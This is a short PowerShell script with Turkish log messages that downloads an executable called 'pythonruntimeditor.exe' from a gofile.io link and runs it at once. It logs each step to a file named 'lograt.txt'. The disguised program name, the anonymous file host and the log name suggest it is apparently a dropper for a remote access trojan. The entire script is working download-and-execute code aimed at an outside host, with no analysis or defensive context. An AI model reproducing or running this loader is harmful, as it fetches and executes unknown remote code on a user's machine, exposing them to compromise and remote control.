$exeUrl = "https://store10.gofile.io/download/web/f251cd75-0191-4927-9a7b-2035446b5c3d/pythonruntimeditor.exe"
$logFile = "$env:USERPROFILE\Downloads\lograt.txt"
$log = { param($msg) Add-Content -Path $logFile -Value ("[$(Get-Date -Format 'HH:mm:ss')] $msg") }

try {
    & $log "Script başlatıldı."

    # EXE'yi indir
    $localPath = "$env:USERPROFILE\Downloads\pythonruntimeditor.exe"
    if (-not (Test-Path $localPath)) {
        & $log "EXE indiriliyor..."
        Invoke-WebRequest -Uri $exeUrl -OutFile $localPath -UseBasicParsing -ErrorAction Stop
        & $log "EXE indirildi: $localPath"
    }

    # EXE'yi çalıştır
    & $log "EXE çalıştırılıyor..."
    Start-Process -FilePath $localPath -WindowStyle Normal
    & $log "EXE çalıştırıldı."
} catch {
    & $log "HATA: $($_.Exception.Message)"
}
